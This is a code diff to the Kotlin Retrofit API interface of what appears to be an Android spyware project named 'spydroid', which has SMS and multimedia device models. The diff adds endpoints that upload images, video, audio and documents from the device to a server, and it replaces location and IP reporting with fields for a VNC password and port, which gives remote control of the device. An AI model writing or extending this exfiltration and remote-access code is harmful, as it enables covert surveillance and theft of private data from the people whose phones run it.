@@ -21,12 +21,18 @@ import net.spydroid.common.remote.network.models.Devices
 import net.spydroid.common.remote.network.models.InfoDevices
 import net.spydroid.common.remote.network.models.MultimediaDevices
 import net.spydroid.common.remote.network.models.SmsDevices
+import okhttp3.MultipartBody
+import okhttp3.RequestBody
 import retrofit2.http.GET
 import retrofit2.http.Query
 import retrofit2.Call
 import retrofit2.http.Field
 import retrofit2.http.FormUrlEncoded
+import retrofit2.http.Multipart
 import retrofit2.http.POST
+import retrofit2.http.PUT
+import retrofit2.http.Part
+import retrofit2.http.Path
 
 
 private object Routes {
@@ -101,9 +107,8 @@ interface ApiService {
     fun createInfo(
         @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
         @Field(PARAMS.ALIAS) alias: String,
-        @Field("ip_public") ipPublic: String,
-        @Field("ip_private") ipPrivate: String,
-        @Field("location") location: String
+        @Field("vnc_password") vnc_password: String,
+        @Field("vnc_port") vnc_port: Int,
     ): Call<Void>
 
     @FormUrlEncoded
@@ -124,16 +129,55 @@ interface ApiService {
     ): Call<Void>
 
 
-    /*
-        // Multipart
+    // UPDATE
+    @FormUrlEncoded
+    @PUT("info/{${PARAMS.ALIAS}}")
+    fun updateInfo(
+        @Path(PARAMS.ALIAS) alias: String,
+        @Field(PARAMS.ACCESS_TOKEN) accessToken: String,
+        @Field("vnc_password") vnc_password: String,
+        @Field("vnc_port") vnc_port: Int,
+    ): Call<Void>
+
+    // MULTIPART
     @Multipart
-    @POST("upload/video")
-    Call<Void> uploadFile(
-    @Query("access_token") String accessToken,
-    @Query("alias") String alias,
-    @Part MultipartBody.Part file,
-    @Part("description") RequestBody description
-    );
-     */
+    @POST("/upload/image")
+    fun uploadImage(
+        @Query("access_token") accessToken: String,
+        @Query("alias") alias: String,
+        @Part file: MultipartBody.Part,
+        @Part("description") description: RequestBody
+    ): Call<String>
+
+
+    @Multipart
+    @POST("/upload/video")
+    fun uploadVideo(
+        @Query("access_token") accessToken: String,
+        @Query("alias") alias: String,
+        @Part file: MultipartBody.Part,
+        @Part("description") description: RequestBody
+    ): Call<String>
+
+
+    @Multipart
+    @POST("/upload/audio")
+    fun uploadAudio(
+        @Query("access_token") accessToken: String,
+        @Query("alias") alias: String,
+        @Part file: MultipartBody.Part,
+        @Part("description") description: RequestBody
+    ): Call<String>
+
+
+    @Multipart
+    @POST("/upload/document")
+    fun uploadDocument(
+        @Query("access_token") accessToken: String,
+        @Query("alias") alias: String,
+        @Part file: MultipartBody.Part,
+        @Part("description") description: RequestBody
+    ): Call<String>
+
 
 }
